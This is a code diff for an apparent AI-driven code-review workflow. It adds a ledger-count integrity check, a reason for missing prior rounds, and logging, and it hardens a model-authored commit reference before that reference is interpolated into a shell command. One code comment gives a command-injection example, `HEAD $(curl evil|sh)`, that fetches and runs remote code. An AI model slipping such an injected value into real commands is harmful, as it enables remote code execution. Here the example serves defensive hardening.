@@ -350,12 +350,14 @@ const LEDGER_ITEM = {
 const PRIOR_ROUND_SCHEMA = {
   type: 'object',
   additionalProperties: false,
-  required: ['found', 'round', 'head', 'ledger', 'priorFindings'],
+  required: ['found', 'round', 'head', 'ledger', 'ledgerCount', 'priorFindings', 'reason'],
   properties: {
     found: { type: 'boolean' },
     round: { type: 'integer', description: 'the prior round number; 0 when found=false' },
     head: { type: 'string', description: 'prior HEAD sha; empty when found=false' },
     ledger: { type: 'array', items: LEDGER_ITEM, description: 'prior findings with fp/symbol/tier/disposition; empty when found=false' },
+    ledgerCount: { type: 'integer', description: 'the ledger length the script computed — copy it as printed; the workflow checks it against the array it received and treats a mismatch as a truncated transport' },
+    reason: { type: 'string', description: 'why there is no prior round (no-store, no-index, no-candidate-rows, unattributable-rows-only, ancestry-rejected, detail-unreadable, partial-only, git-unavailable); empty when found=true' },
     priorFindings: { type: 'integer', description: 'total findings the prior round reported (its record findings.total); 0 when found=false or unknown — used to detect a round that found bugs but persisted no ledger' },
   },
 }
@@ -850,8 +852,19 @@ function rereviewVerdict({ stillOpen = [], regressed = [], neu = [] } = {}) {
 //   shouldFullRescan — every `fullEvery`-th re-review (and always when the ledger is degraded, or on a
 //     first review) re-scans the FULL base...HEAD diff so an earlier miss in untouched code resurfaces.
 //     fullEvery<=0 disables the periodic full scan (pure incremental).
+//   ledgerTruncated — the ledger crosses an agent boundary as structured output. The loader script
+//     prints an authoritative `ledgerCount` beside it; if the array that arrived is a different
+//     length, entries were lost in transport and an 82-entry round would otherwise be carried as a
+//     genuine 20-entry one. Degraded → full re-scan, same as a missing ledger.
+function ledgerTruncated(priorRound) {
+  if (!priorRound) return false
+  const count = Number(priorRound.ledgerCount)
+  if (!Number.isFinite(count)) return false   // a record from before the count existed: nothing to check
+  return count !== (Array.isArray(priorRound.ledger) ? priorRound.ledger.length : 0)
+}
 function ledgerDegraded(priorRound) {
   if (!priorRound) return false
+  if (ledgerTruncated(priorRound)) return true
   const findings = Number(priorRound.priorFindings || 0)
   const ledgerLen = Array.isArray(priorRound.ledger) ? priorRound.ledger.length : 0
   return findings > 0 && ledgerLen === 0
@@ -919,10 +932,16 @@ Run exactly this:
 cd ${shq(repoArg || '.')} && node ${LOGGER_PATH} prior-round --branch ${shq(branch)} --project "$PWD"
 \`\`\`
 
-It prints ONE line of JSON and always exits 0. Return that object VERBATIM — copy the \`ledger\` array byte for byte, do not summarize, re-key, truncate or "clean up" any entry. If the command prints nothing or cannot run, return {found:false, round:0, head:"", ledger:[], priorFindings:0}.`,
+It prints ONE line of JSON and always exits 0. Return that object VERBATIM — copy the \`ledger\` array byte for byte, do not summarize, re-key, truncate or "clean up" any entry. It prints \`ledgerCount\` alongside \`ledger\` — copy that number EXACTLY as printed; never recount, never adjust it to the array you are returning. If the command prints nothing or cannot run, return {found:false, round:0, head:"", ledger:[], ledgerCount:0, priorFindings:0, reason:"loader-did-not-run"}.`,
     { label: 'prior-round', schema: PRIOR_ROUND_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' },
   )
-  if (!priorRound?.found) priorRound = null
+  // Every rejection has a reason and the reason is LOGGED. Silence here is the exact defect this
+  // command replaced: the first re-review of a branch whose rows predate the absolute-path key
+  // restarts from a blank ledger, and that must be visible rather than inferred from thin results.
+  if (!priorRound?.found) {
+    if (priorRound?.reason) log(`No prior round: ${priorRound.reason}`)
+    priorRound = null
+  }
   // Harden the model-authored ledger `head` at the LOAD boundary before it ever reaches a shell
   // command (it is interpolated into the carry/adjudicate `git diff <head>...HEAD`). If it is not a
   // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
@@ -932,6 +951,10 @@ It prints ONE line of JSON and always exits 0. Return that object VERBATIM — c
     log(`⚠️ prior-round head ${JSON.stringify(priorRound.head)} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
     priorRound.head = baseRef
   }
+}
+// Transport integrity: assert the ledger we received is the ledger the script printed.
+if (priorRound && ledgerTruncated(priorRound)) {
+  log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRound.ledgerCount} entr(ies), ${priorRound.ledger?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
 }
 if (priorRound) log(`Re-review: prior round ${priorRound.round} @ ${flattenField(priorRound.head)} · ${priorRound.ledger?.length || 0} ledger finding(s)`)
 else log(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')
